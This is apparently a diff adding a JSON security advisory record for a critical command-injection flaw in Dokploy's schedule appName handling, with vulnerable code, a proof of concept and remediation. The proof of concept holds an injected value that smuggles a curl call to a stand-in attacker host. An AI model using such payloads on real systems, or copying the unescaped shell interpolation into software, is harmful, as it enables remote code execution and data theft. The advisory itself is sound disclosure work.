@@ -1,0 +1,46 @@
+{
+  "global": null,
+  "id": "GHSA-8m32-h7qx-8r79",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-77"
+    ],
+    "description": "## Information\r\n- **Project:** Dokploy\r\n- **Version:** v0.29.4\r\n- **Severity:** Critical (10.0)\r\n- **Vulnerability Type:** Command Injection (CWE-77)\r\n\r\n## Description\r\nWhen creating or updating a schedule in Dokploy, the `appName` can be provided by the user. This `appName` is used to construct a directory path that is then used in a shell command (`mkdir -p`) without proper escaping or sanitization. This leads to a Remote Code Execution (RCE) vulnerability.\r\n\r\n## Code Analysis\r\nIn [packages/server/src/services/schedule.ts](file:///home/veronica/bot/audit/dokploy-audit/dokploy/packages/server/src/services/schedule.ts):\r\n```typescript\r\nconst handleScript = async (schedule: Schedule) => {\r\n    const { SCHEDULES_PATH } = paths(!!schedule?.serverId);\r\n    const fullPath = path.join(SCHEDULES_PATH, schedule?.appName || \"\");\r\n\r\n    // ...\r\n    const script = `\r\n         mkdir -p ${fullPath}\r\n         rm -f ${fullPath}/script.sh\r\n         touch ${fullPath}/script.sh\r\n         chmod +x ${fullPath}/script.sh\r\n         echo \"${encodedContent}\" | base64 -d > ${fullPath}/script.sh\r\n    `;\r\n\r\n    if (schedule?.scheduleType === \"dokploy-server\") {\r\n        await execAsync(script);\r\n    }\r\n    // ...\r\n};\r\n```\r\nThe `fullPath` variable, which includes the user-controlled `appName`, is interpolated directly into the `script` string and executed via `execAsync`.\r\n\r\n## Proof of Concept\r\n1. Create a new Schedule.\r\n2. Set the `appName` to: `mysched; curl http://attacker.com/$(whoami); #`\r\n3. Save the schedule.\r\n4. The server executes:\r\n   ```bash\r\n   mkdir -p /etc/dokploy/schedules/mysched; curl http://attacker.com/$(whoami); #\r\n   ...\r\n   ```\r\n5. The injected `curl` command executes on the host.\r\n\r\n## Impact\r\nFull system compromise. An attacker can execute arbitrary commands on the host system with root-level access (as Dokploy usually runs with high privileges to manage Docker).\r\n\r\n## Remediation\r\n1. **Schema Validation**: Enforce a strict regex for `appName` in the `schedules` schema (e.g., `^[a-z0-9-]+$`).\r\n2. **Safe Shell Execution**: Avoid interpolating variables into shell strings. Use argument arrays with `spawn` or a similar safe execution method.\r\n3. **Escaping**: If shell interpolation is unavoidable, use `shell-quote` to escape all variables.\r\n",
+    "ghsa_id": "GHSA-8m32-h7qx-8r79",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-8m32-h7qx-8r79",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-8m32-h7qx-8r79"
+      }
+    ],
+    "published_at": "2026-11-12T08:17:29Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "RCE via Command Injection in Schedule appName",
+    "updated_at": "2026-11-12T08:37:18Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "dokploy"
+        },
+        "patched_versions": "0.31.1",
+        "vulnerable_version_range": "< 0.31.1"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
